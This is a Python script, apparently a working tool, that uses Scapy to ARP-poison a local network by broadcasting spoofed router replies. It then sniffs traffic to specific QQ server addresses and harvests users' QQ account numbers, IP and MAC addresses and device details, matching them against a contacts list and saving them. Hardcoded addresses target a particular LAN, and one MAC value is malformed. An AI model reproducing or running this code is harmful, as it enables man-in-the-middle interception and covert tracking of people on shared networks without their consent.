from multiprocessing import Process, Queue

from scapy.all import *
from util import get_qq_info_phone, get_qq_info_computer, get_qq_dict
from util import *

def send_poison(mymac, myip, routemac, routeip):
    q1 = Queue() #建立队列，实现进程间的消息传递 send_position --> get_pkg
    q2 = Queue() # get_pkg --> send_position
    gp = Process(target=get_pkg, args=(q1, q2))
    gp.start()
    poison = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=mymac, psrc=routeip, op='is-at')
    sendp(poison, inter=0.2, loop=1)
    antidote = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=routemac, psrc=routeip, op='is-at')
    sendp(antidote, count=30)
    q1.put(-1)
    if q2.get(True) == -1:
        if gp.is_alive():
            gp.terminate()


def get_pkg(q1, q2):
    qq_list = []
    qq_dict = get_qq_dict()
    rows = []
    while True:
        ft = 'ip dst 182.254.10.38 or ip dst 182.254.10.37 or ip dst 182.254.41.37 or ip dst 182.254.41.36'
        pkg = sniff(filter=ft, count=200)
        print("") #换行
        for p in pkg:
            try:
                if q1.get(False) == -1:
                    save_qq_info(rows)
                    q2.put(-1)
                    return
            except Exception as e:
                pass
            if p.sprintf('%Ether.src%') == '78:0c:b8:37:06:86':
                continue
            try:
                if p.sprintf('%IP.dst%') == '182.254.10.38' or p.sprintf('%IP.dst%') == '182.254.10.37':
                    qq_info = get_qq_info_phone(p)
                else:
                    qq_info = get_qq_info_computer(p)
            except Exception as e:
                continue
            if qq_info not in qq_list:
                qq_num = str(qq_info[0])
                if qq_dict.get(qq_num, False):
                    print(qq_num + ':' + qq_dict[qq_num] + "; Ip地址:" + qq_info[1] + "; mac地址-->" + qq_info[2] + '; ' + qq_info[3])
                    row = (qq_num, qq_dict[qq_num], qq_info[1], qq_info[2], qq_info[3])
                else:
                    row = (qq_num, "陌生人", qq_info[1], qq_info[2], qq_info[3])
                qq_list.append(qq_info)
                rows.append(row)


if __name__ == '__main__':
    mymac = '78:0c:b8:37:06:86'
    myip = '192.168.68.185'
    routemac = '14:14:4b:77:f4:8'
    routeip = '192.168.0.1'
    sp = Process(target=send_poison, args=(mymac, myip, routemac, routeip))
    sp.start()
